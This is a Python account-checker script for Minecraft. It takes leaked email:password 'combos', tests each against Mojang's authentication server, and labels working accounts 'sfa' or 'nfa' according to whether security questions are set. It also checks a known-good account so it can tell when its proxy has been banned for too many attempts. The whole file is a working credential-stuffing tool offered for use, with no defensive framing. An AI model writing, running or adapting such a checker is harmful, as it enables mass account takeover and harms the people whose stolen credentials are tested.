import requests
from requests import Session, exceptions
import json
working_acc = "INPUT A MINECRAFT ACCOUNT WHICH IS ALWAYS VALID"
sfa_url = 'https://api.mojang.com/user/security/challenges'
while True:
    combo = input("Combo: ")
    while ':' not in combo:
        combo = input("Enter the account details in email:password format: ")
    
    username = combo.split(':')[0]
    password = combo.split(':')[1]
    
    with requests.Session() as session:
        response = session.post("https://authserver.mojang.com/authenticate", json={ 'agent' : {"name" : "Minecraft", "version" : 1}, 'username': username, 'password': password})
        if response.status_code == 200:
            
            
            data = response.json()
            uuid = data['selectedProfile']['id']
            token = data['accessToken']
            headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
    
            z = session.get(url=sfa_url, headers=headers).text
            if z == '[]':
                print("sfa")
            else:
                print("nfa")
    
                
        else:
            email, pasi = working_acc.split(":")
            with requests.Session() as session:
                response = session.post("https://authserver.mojang.com/authenticate", json={ 'agent' : {"name" : "Minecraft", "version" : 1}, 'username': email, 'password': pasi})
                if response.status_code == 200:
                    print("account invalid")
                else:
                    print("Proxy got shadow banned")







